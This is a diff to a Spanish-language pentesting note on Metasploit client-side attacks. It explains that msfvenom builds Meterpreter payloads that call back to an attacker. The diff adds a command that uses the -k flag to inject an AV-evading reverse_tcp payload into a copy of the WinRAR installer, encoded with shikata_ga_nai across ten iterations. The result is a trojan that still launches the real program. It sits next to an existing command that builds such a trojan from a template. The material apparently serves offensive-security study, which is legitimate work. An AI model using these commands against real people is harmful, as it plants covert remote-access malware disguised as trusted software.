@@ -1,10 +1,10 @@
 # Ataques del lado del cliente con Metasploit 
 
-Tags: #Metasploit #Msfvenom #Encode #Payloads #Shellcode #AntiVirus #InjectPayloads
+Tags: #Metasploit #Msfvenom #Encode #Payloads #Shellcode #AntiVirus #InjectPayloads #Automatizar
 
 * Client-Side Attacks: Es un vector de ataque hace que un cliente ejecute un payload malicioso en su sistema que consecuentemente hará una conexión trasera con un atacante cuando sea ejecutado. Utiliza documentos o archivos ejecutables. 
 
-## Msfvenom
+## Msfvenom Payloads
 
 Msfconsole: Es una utilidad de línea de comando que puede ser usada para generar y encodear payloads MSF para varios sistemas operativos, así, como servidores web. Es la combinación de dos utilidades: Msfpayload y Msfencode. Podemos utilizar Msfvenom para generar payloads maliciosos en Meterpreter que pueden ser transferidos al sistema del cliente. Una vez ejecutados, harán una conexión a nuestro payload handler y nos proveerá un acceso remoto al sistema target.  
 
@@ -179,8 +179,10 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ```bash 
 # Creamos el payload y se lo pasamos a un archivo ejecutable 'confiable'
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
+	# x = Especificar el archivo ejecutable para usar como plantilla (No inicia el proceso del archivo ejecutable)
 
-	# x = Especificar el archivo ejecutable para usar como plantilla
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
+	# k = Preserva la plantilla con el comportamiento original del ejecutable y ademas inyecta el payload (Inicia normal el proceso del archivo ejecutable)
 ```
 
 ```bash 
